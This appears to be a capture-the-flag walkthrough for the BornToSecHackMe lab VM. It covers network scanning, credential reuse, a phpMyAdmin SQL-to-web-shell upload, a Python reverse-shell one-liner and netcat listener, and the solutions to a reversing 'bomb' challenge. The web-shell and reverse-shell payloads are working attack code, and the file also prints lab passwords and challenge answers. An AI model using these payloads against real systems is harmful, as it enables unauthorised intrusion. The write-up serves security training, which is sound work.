## nmap  
scan the network 10.11.0.0/16
```
Nmap scan report for 10.11.100.94
Host is up (0.0013s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

## dirb 
### commad:
```
gobuster  dir --url https://{IP} --wordlist /usr/share/wordlists/dirb/common.txt --no-tls-validation
```

DIRB IS a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
![ alt text for screen readers](imgs/dirb_scanHTTP.png "dirb_scanHTTP")
![ alt text for screen readers](imgs/dirb_scanHTTPS.png "dirb_scanHTTP")

## 
from threats posted on the forum i found an intersting one "login problem"
reading the logs , a line says: 'Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2'
    - sounds like someone write a password in username field.
    - tried to connect using ssh users form forum and this password (didn't work)
    - tried to log in to forum with:
    ```
    username: lmezard
    password: !q\]Ej?*5K5cy*AJ
    ```
    - it works , i also got the email from the user profile
    email: laurie@borntosec.net

### The same password was used to log in to webmail
    user: laurie@borntosec.net
    password: !q\]Ej?*5K5cy*AJ

+ on the inbox i there's a mail contain credential to a databases 
![ alt text for screen readers](imgs/db_access.png "db credentials")

## access phpMyAdmin

login: root

password: Fg-'kKXBj87E:aJ$

## inject a webshell in sql 
ressource: https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/pyload.php"



export RHOST="IP";export RPORT=3412;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

## GET a foothold on the machine 

open a port and start listening for incoming connection

nc -lk -p 3412

encode the pyload and pass it to cmd in the browser : https://IP/forum/templates_c/pyload.php?cmd=(encoded pyload)

┌──(kali㉿kali)-[~]
└─$ nc -lk -p 3412
$ whoami
whoami
www-data



## trying to gain access to a valid user 

#list users 
laurie@borntosec.net@BornToSecHackMe:~$ getent passwd {1000..60000}
getent passwd {1000..60000}
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash

# find files owned by our current user

find / -perm -u=s -type f 2>/dev/null

```
notice this file /rofs/home/LOOKATME/password

cat /rofs/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"

run su lmezard
password: G!@M6f4Eatau{sF"
```

in the user's home folder we find these files

lmezard@BornToSecHackMe:~$ ls
fun  README

by examining the file named fun, you will realize its an archive

lmezard@BornToSecHackMe:~$ file fun
fun: POSIX tar archive (GNU)

to extract it you could either chmod the home to gain rights to extract in the current directory, or you can copy it to var/tmp and extract it there


lmezard@BornToSecHackMe:~$ tar -xf fun

you get a folder called ft_fun which contains many files.

upon examining these files, you realize  that when combined together they make up one c program that has a ton of misleading comments. the trick will be to figure out the right order ofthe files

lets examin one of the files

lmezard@BornToSecHackMe:~/ft_fun$ cat 4ELRN.pcap
}void useless() {

//file237
you will notice that all the files end with //file number

after multiple attemps i figured that the comment at the endo f each file is its actual order, so the solution would be to rename all the files each one acording to the number in its last line

to achieve this , i made a script using python whichcan be found in the scripts folder

┌──(kali㉿kali)-[~]
└─$ python name_correcter.py | sh
                                                                                          
┌──(kali㉿kali)-[~]
└─$ cd ft_fun 
                                                                                          
┌──(kali㉿kali)-[~/ft_fun]
└─$ for file in *; do (cat "${file}"; echo \n) >> combine.c; done
                                                                                          
┌──(kali㉿kali)-[~/ft_fun]
└─$ gcc combine.c 
                                                                                          
┌──(kali㉿kali)-[~/ft_fun]
└─$ ./a.out 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit                                                                                          

┌──(kali㉿kali)-[~]
└─$ echo -n  Iheartpwnage |  sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -

 name_correcter.py is just a script that loops through all the files inside the ft_fun directory, and prints out a linux command that renames the current file with its correct order number, the order number can be found in the final line of each file,

## bomb

after connecting to laurie you will find these files in her home directory

laurie@BornToSecHackMe:~$ ls
bomb  README

bomb is a program that prompts you for input 6 times, each time it checks if what you entered is correct using a different function for each phase

phase_1: checks if the input is equal to "Public speaking is very easy."

   0x08048b2c <+12>:	push   0x80497c0
=> 0x08048b31 <+17>:	push   eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>

(gdb) x /s 0x80497c0
0x80497c0:	"Public speaking is very easy."


so the user input is compared against the following string "Public speaking is very easy."

phase_2: checks if the input is equal to "1 2 6 24 120 720"

first condition is to check if the first number is equal to 1
  0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1

then it proceeds to a loop through the array of the numbered you entered
the loop startsat index 1 ; which is the second element
then it compares the number at the current index to (index + 1) * previous number, they must be equal to eachother

so this makes it easy the correct number for each elemet is (index + 1) * previous number, lets start from the beginning at index 1;
current index  = 1, previous number = 1   (1 + 1)* 1 = 2
current index  = 2, previous number = 2   (2 + 1)* 2 = 6 
current index  = 1, previous number = 1   (3 + 1)* 6 = 24
current index  = 1, previous number = 1   (4 + 1)* 24 = 120
current index  = 1, previous number = 1   (5 + 1)* 120 = 720




phase_3: checks if the input is equal to "6 v 780"

first the function calls scanf with these flags: "%d %c %d"   (one int one character then one int)
then a switch case condition is called, checking if the first number is equal to either one of the numbers from 0 to 6, and each one of these conditions checks if the characterand last number are equal to a specific value

this pretty much means there are 7 correct solutions to this phase, i choose to print the 6th one, by entering this string "6 a 1", this will allow me to access the 7th condition case, and i can print the awaited values of the character and second number, in this case its "6 v 780"


phase_4: checks if the input is equal to  "9"

firstly the function calls scanf with this flag "%d", taking in an int

and then it checks if the number is bigger than 0, then passes the number as a parameter to function func4 if the parameter is equal or less than 1, then func4 returns 1, else function func4 recusivly calls itself twice, func4(parameter -1) and func4(parameter - 2) then it returns the sum of the result of those two calls, ofcourse again inside of each recurive call to func4, another func4 is called in the same manner, and so on.
then once func4 is done, its final result must be equal to 55

i managed to reverse this so i can find the right number that leads to the final result of 55. the script can be found in phase_4.py

phase_5:  checks if the input is equal to  "opekma"

firsty, the function checks that the input string's length is 6
then theres a while loop through the characters of the string, each character is anded with 0xf then the result is used as the index of a character from this string "isrveawhobpnutfg"
it does this to each character and by the end we get a whole new string with the characters taken from "isrveawhobpnutfg", and this new string should be "giants". so in order to reverse this

i made a script that takes "aaaaaa"  as the initial input, then increments each character after anding it with 0xf, and using that number as an index on the string "isrveawhobpnutfg". if it equals to its equivalant character from "giants" then the scrip passes to the next character from the initial input. at the end i get a string that solves phase_5.

